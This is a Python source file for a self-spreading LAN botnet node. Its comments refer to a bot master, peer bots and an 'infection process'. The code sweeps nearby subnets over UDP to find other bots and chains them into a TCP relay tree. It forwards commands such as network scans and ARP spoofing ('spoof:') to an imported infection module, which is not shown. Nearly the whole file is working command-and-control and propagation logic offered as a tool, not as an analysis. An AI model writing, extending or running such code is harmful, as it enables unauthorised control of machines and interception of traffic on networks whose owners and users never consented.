import multiprocessing
import time
import enum
from infect import main_infect
import threading
import socket
import random


# the protocol
class Types(enum.Enum):
    COMMAND = 1
    COMMAND_RESULT = 2


# convert requests to the valid operation
def convert(choice):
    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "get_trees":
        return Types.COMMAND
    elif choice == "scan_result" or choice == "scan_result:" or choice == "spoof_result" or choice == "trees_result":
        return Types.COMMAND_RESULT
    return None


# handles all the commands
def handle_command(data, clients, srv):
    if data == "scan":
        parent_conn.send(data)
        clients = parent_conn.recv()
        choice = "scan_result"
        return clients, choice

    elif data.find("scan:") != -1:
        parent_conn.send(data)
        mac = parent_conn.recv()
        choice = "scan_result:"
        clients.append({'ip': data.split(":")[1], 'mac': mac})
        return mac, choice

    elif data.find("spoof:") != -1:
        chosen_ip = data.split(":")[1]
        chosen_mac = ""
        for client in clients:
            if client['ip'] == chosen_ip:
                chosen_mac = client['mac']
        parent_conn.send(data)
        parent_conn.send(chosen_ip)
        parent_conn.send(chosen_mac)
        parent_conn.send(srv)
        result = parent_conn.recv()
        choice = "spoof_result"
        return result, choice

    elif data == "get_trees":
        choice = "trees_result"
        trees = "recv from: "
        for receiver in receiver_tree:
            trees += receiver + " "
        trees += "\nsending to: "
        for sender in sender_tree:
            trees += sender + " "
        trees += "\nlan: "
        for host in lan_tree:
            trees += host + " "
        return trees, choice


# handles all the command's results (sends back to the bot master)
def handle_command_result(sock, data, output):
    global messages
    if data == "scan_result":
        if output:
            string = "IP" + " " * 15 + "MAC"
            for client in output:
                string += "\n" "{}   {}".format(client['ip'], client['mac'])
            messages = string
        else:
            messages = "scan failed"

    elif data == "scan_result:":
        messages = output

    elif data == "spoof_result":
        pass

    elif data == "trees_result":
        messages = output

    else:
        messages = output


# sends to the entire network message to check for other bots
def send_to_network():
    sender_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for host in ips:
            sender_udp.sendto("####".encode(), (host, 48000))
        time.sleep(30.0)


# listening for bots in the LAN and answering them
def recv_replies():
    receiver_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    receiver_udp.bind(("0.0.0.0", 48000))
    while True:
        (reply, remote_address) = receiver_udp.recvfrom(4)
        if reply.decode().find("#") != -1 and remote_address[0] not in lan_tree:
            lan_tree.append(remote_address[0])
            receiver_udp.sendto("####".encode(), (remote_address[0], 48000))


# prepares a list of ips to send them the bot message
def ip_list():
    ips = []
    my_ip = ip
    numbers = my_ip.split(".")
    third_digit = str(int(numbers[2]) - 2)
    fourth_digit = "0"

    if int(third_digit) < 0:
        third_digit = "0"

    while int(third_digit) <= int(numbers[2]) + 2:
        host = numbers[0] + "." + numbers[1] + "." + third_digit + "." + fourth_digit
        ips.append(host)
        if int(fourth_digit) < 255:
            fourth_digit = str(int(fourth_digit) + 1)
        else:
            third_digit = str(int(third_digit) + 1)
            fourth_digit = "0"

    return ips


# thread that receives commands from other bots
def con_thread(sock, addr):
    global messages
    choice = ""
    output = ""
    clients = []
    fc = ""
    http_srv = ""
    while True:
        try:
            forward = False
            if choice == "":
                choice = sock.recv(1024).decode()
                fc = choice

            if choice.find("-") != -1:
                if len(choice.split("-")) == 2:
                    cip = choice.split("-")[1]
                    choice = choice.split("-")[0]
                    if cip != ip:
                        forward = True
                        choice = ""
                        messages = fc
                elif len(choice.split("-")) == 3:
                    http_srv = choice.split("-")[2]
                    cip = choice.split("-")[1]
                    choice = choice.split("-")[0]
                    if cip != ip:
                        forward = True
                        choice = ""
                        messages = fc

            if not forward:
                data = choice
                data_type = convert(choice)
                choice = ""

                if not data_type:
                    messages = data

                else:
                    if data_type == Types.COMMAND:
                        output, choice = handle_command(data, clients, http_srv)
                    elif data_type == Types.COMMAND_RESULT:
                        handle_command_result(sock, data, output)
        except Exception as ex:
            receiver_tree.remove(addr[0])
            return


# thread that connects to hosts in lan
def clients():
    while True:
        number = 5
        for host in lan_tree:
            if len(sender_tree) < 6 and host != ip and host not in sender_tree:
                if len(sender_tree) > 3:
                    number = random.randint(1, 6)
                    time.sleep(60)
                if number == 5:
                    nc = threading.Thread(target=new_conn, args=(host,))
                    nc.start()
                    sender_tree.append(host)


# tries to connect to a host and sends to it messages that it gets
def new_conn(host):
    client_tcp = socket.socket()
    last_msg = ""
    try:
        client_tcp.connect((host, 49000))
    except:
        sender_tree.remove(host)
        return
    while True:
        try:
            if messages:
                msg = messages
                if last_msg != msg:
                    last_msg = msg
                    client_tcp.send(msg.encode())
                else:
                    time.sleep(2)
        except:
            sender_tree.remove(host)
            return


if __name__ == '__main__':
    multiprocessing.freeze_support()
    # get ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()

    messages = ""
    ips = ip_list()
    lan_tree = []
    sender_tree = []
    receiver_tree = []
    server_tcp = socket.socket()

    send_thread = threading.Thread(target=send_to_network)
    recv_thread = threading.Thread(target=recv_replies)
    send_thread.start()
    recv_thread.start()

    can_infect = False
    # creating a duplex pipe for the IPC
    parent_conn, child_conn = multiprocessing.Pipe()

    # tries to spawn the infection process
    try:
        p1 = multiprocessing.Process(target=main_infect, args=(child_conn, ))
        p1.start()
        can_infect = True
    except Exception as ex:
        pass

    clns = threading.Thread(target=clients)
    clns.start()

    server_tcp.bind(("0.0.0.0", 49000))
    server_tcp.listen()

    # accepting connections
    while True:
        (client_socket, client_address) = server_tcp.accept()
        receiver_tree.append(client_address[0])
        con_th = threading.Thread(target=con_thread, args=(client_socket, client_address,))
        con_th.start()
